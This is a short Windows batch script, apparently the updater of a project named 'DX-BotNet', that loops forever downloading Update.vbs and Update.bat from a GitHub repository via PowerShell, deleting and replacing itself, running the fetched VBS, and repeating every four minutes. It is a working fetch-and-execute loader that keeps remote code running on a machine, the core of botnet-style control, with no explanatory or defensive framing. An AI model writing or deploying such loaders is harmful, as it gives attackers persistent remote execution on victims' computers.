:start
timeout /t 1
echo #---------------------------------------------------------------------------------------------------------------------------#
powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDXT/DX-BotNet/main/Update.vbs -OutFile Update.vbs"
echo #---------------------------------------------------------------------------------------------------------------------------#
timeout /t 5
del Update.bat
del Update.bat
echo #---------------------------------------------------------------------------------------------------------------------------#
powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDXT/DX-BotNet/main/Update.bat -OutFile Update.bat"
timeout /t 5
start Update.vbs
timeout /t 240
echo #---------------------------------------------------------------------------------------------------------------------------#
goto start
